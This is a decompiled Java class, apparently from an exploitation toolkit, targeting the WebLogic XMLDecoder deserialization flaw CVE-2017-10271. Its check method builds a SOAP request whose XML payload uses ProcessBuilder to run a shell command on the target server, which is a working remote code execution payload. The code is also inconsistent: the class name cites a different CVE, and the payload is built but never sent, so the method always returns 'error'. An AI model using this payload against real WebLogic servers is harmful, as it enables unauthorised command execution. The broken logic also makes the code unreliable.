package com.artillery.payloads;

//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Iterator;

public class CVE20144210 {
    private String name = "weblogic XMLDecoder反序列化漏洞（CVE_2017_10271）";
    private String descript = "WebLogic WLS组件中存在CVE-2017-10271远程代码执行漏洞，可以构造请求对运行WebLogic中间件的主机进行攻击，近期发现此漏洞的利用方式为传播挖矿程序。";
    private String cve_number = "CVE_2017_10271";

    public CVE20144210() {
    }

    public String check(String target) {
        boolean flag = true;
        String result = "error";
        String url = "";
        if (!target.startsWith("http") && !target.startsWith("https")) {
            url = "http://" + target.split(":")[0] + ":" + target.split(":")[1];
        } else {
            url = target;
        }

        HashMap<String, String> header = new HashMap();
        header.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0");
        header.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        header.put("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");
        header.put("Content-Type", "text/xml;charset=UTF-8");
        String checkurl = url + "/wls-wsat/CoordinatorPortType";
        System.out.println(checkurl);
        String post_str = " <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\">      <soapenv:Header>        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">          <java>            <void class=\"java.lang.ProcessBuilder\">              <array class=\"java.lang.String\" length=\"2\">                <void index=\"0\">                  <string>/bin/touch</string>                </void>                <void index=\"1\">                  <string>/tmp/weblogic</string>                </void>              </array>              <void method=\"start\"/>            </void>          </java>        </work:WorkContext>      </soapenv:Header>      <soapenv:Body/>    </soapenv:Envelope>";



        return result;
    }

    public static void main(String[] args) {

    }
}
